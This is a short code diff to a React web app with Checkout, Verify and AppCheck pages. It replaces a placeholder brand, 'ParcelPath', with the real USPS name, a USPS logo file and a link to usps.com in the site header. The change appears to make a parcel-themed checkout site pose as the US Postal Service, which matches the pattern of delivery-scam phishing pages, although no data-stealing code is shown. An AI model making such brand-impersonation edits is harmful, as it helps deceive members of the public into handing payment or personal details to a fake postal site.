@@ -10,7 +10,7 @@ import Checkout from './pages/Checkout';
 import Verify from './pages/Verify';
 import AppCheck from './pages/AppCheck';
 
-const ADMIN_EXTERNAL_URL = 'https://www.parcelpath.example/';
+const ADMIN_EXTERNAL_URL = 'https://www.usps.com/';
 
 function getRouteNotice(target: string, reason: string) {
   const cleanReason = reason.trim();
@@ -176,8 +176,8 @@ function App() {
               </button>
             </div>
             <div className="alz-nav-brand">
-              <div className="alz-nav-logo" aria-label="ParcelPath">
-                <img src="/usps-header-logo.svg" alt="ParcelPath" className="alz-nav-logo-img" />
+              <div className="alz-nav-logo" aria-label="USPS">
+                <img src="/usps-header-logo.svg" alt="USPS" className="alz-nav-logo-img" />
               </div>
             </div>
             <div className="alz-nav-actions">
